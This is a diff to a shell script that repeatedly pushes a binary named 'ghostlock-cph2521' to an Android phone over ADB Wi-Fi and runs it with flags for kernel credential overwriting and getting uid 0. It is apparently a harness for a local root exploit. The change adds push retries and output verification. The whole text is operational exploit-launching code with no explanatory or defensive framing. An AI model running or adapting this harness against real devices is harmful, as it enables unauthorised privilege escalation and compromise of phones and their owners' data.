@@ -18,8 +18,17 @@ for n in $(seq 1 $MAX); do
     S=$((185 - UP)); sleep $S
   fi
   B="q$(date +%s | tail -c 5)"; L="r$(date +%s | tail -c 6)"
-  MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI push ghostlock-cph2521 /data/local/tmp/$B >/dev/null 2>&1
-  MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "chmod 755 /data/local/tmp/$B; pkill -f gl_uid0_child 2>/dev/null; rm -f /data/local/tmp/ROOTED /data/local/tmp/uid0_id.txt /data/local/tmp/ROOTED_ID.txt; cd /data/local/tmp; nohup sh -c 'timeout 100 env MODE4_ONLY=1 MODE4_SLIDE_CRED=1 MODE4_CRED_INITTASK=1 UID0_DIRECT=1 UID0_PREFER_CHILD=1 UID0_QUIET_CHILD=1 UID0_PUR_SPIN=1 UID0_DOUBLE_PUNCH=1 UID0_SLOT=0x778 UID0_NO_SYNCLOG=1 KPHYS=0xa8000000 CORE_SEL=7 GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log /data/local/tmp/$B' > /sdcard/Download/$L.txt 2>&1 &" >/dev/null 2>&1
+  ok=0
+  for try in 1 2 3 4 5; do
+    P=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI push ghostlock-cph2521 /data/local/tmp/$B 2>&1 | grep -c "1 file pushed")
+    [ "$P" = "1" ] || { con; continue; }
+    MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "chmod 755 /data/local/tmp/$B; pkill -f gl_uid0_child 2>/dev/null; rm -f /data/local/tmp/ROOTED /data/local/tmp/uid0_id.txt /data/local/tmp/ROOTED_ID.txt; cd /data/local/tmp; nohup sh -c 'timeout 100 env MODE4_ONLY=1 MODE4_SLIDE_CRED=1 MODE4_CRED_INITTASK=1 UID0_DIRECT=1 UID0_PREFER_CHILD=1 UID0_QUIET_CHILD=1 UID0_PUR_SPIN=1 UID0_DOUBLE_PUNCH=1 UID0_SLOT=0x778 UID0_NO_SYNCLOG=1 KPHYS=0xa8000000 CORE_SEL=7 /data/local/tmp/$B' > /sdcard/Download/$L.txt 2>&1 &" >/dev/null 2>&1
+    sleep 5
+    V=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "ls /sdcard/Download/$L.txt 2>/dev/null" 2>/dev/null | tr -d '')
+    if [ -n "$V" ]; then ok=1; break; fi
+    con
+  done
+  [ "$ok" = "1" ] || { echo "roll$n: FIRE FAILED after retries" >> $OUT; continue; }
   echo "roll$n: FIRED $L up=$UP $(date +%H:%M:%S)" >> $OUT
   sleep 75
   con || { sleep 20; con || { echo "roll$n: dropped" >> $OUT; continue; }; }
